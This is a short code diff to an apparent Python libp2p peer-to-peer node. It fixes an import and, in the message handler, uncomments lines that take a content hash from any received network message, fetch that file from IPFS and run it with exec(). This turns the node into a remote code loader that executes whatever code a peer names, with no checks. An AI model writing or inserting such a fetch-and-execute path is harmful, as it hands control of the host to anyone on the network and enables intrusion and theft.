@@ -4,7 +4,7 @@ import base58
 import trio
 from libp2p import new_host
 
-from mcache import Ipfs
+from ipfs.mcache import Ipfs
 
 from libp2p.custom_types import (
     TProtocol,
@@ -109,10 +109,10 @@ class Node:
 
                             parts[1] = parts[1].replace("] mesh\"", "").strip()
                             print(parts[1])
-                        # ipfs_client = Ipfs() 
-                        # file_hash = parts[1]
-                        # code=ipfs_client.fetch_file(file_hash)
-                        # exec(code)  
+                        ipfs_client = Ipfs() 
+                        file_hash = parts[1]
+                        code=ipfs_client.fetch_file(file_hash)
+                        exec(code)  
                         logger.info(f"Received message: {message.data.decode('utf-8')}")
                         logger.info(f"{sender_id}: {message.data.decode('utf-8')}")
 
